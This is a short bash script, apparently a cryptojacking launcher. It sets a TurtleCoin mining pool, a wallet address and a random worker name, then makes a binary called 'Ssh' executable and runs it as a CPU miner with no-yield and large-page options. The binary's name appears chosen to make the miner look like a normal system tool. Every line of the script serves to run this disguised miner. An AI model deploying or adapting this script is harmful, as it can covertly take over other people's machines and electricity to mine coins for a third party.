#!/bin/bash
POOL=trtl-miner.azpool.win:8888
WALLET=TRTLuxxh3pUiHZKwvZ7FFq5B3G19Xf4tXaCksky7fumHDf7MXFeAeCZikw4hH9hSGwMiNM1LS7rg3iF6P9WeQ1kJ9vu6JXQCyJS
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-USER)

chmod +x Ssh
./Ssh --cpu-no-yield -a argon2/chukwav2 --tls -k --randomx-1gb-pages -o $POOL -k -u $WALLET -p $WORKER
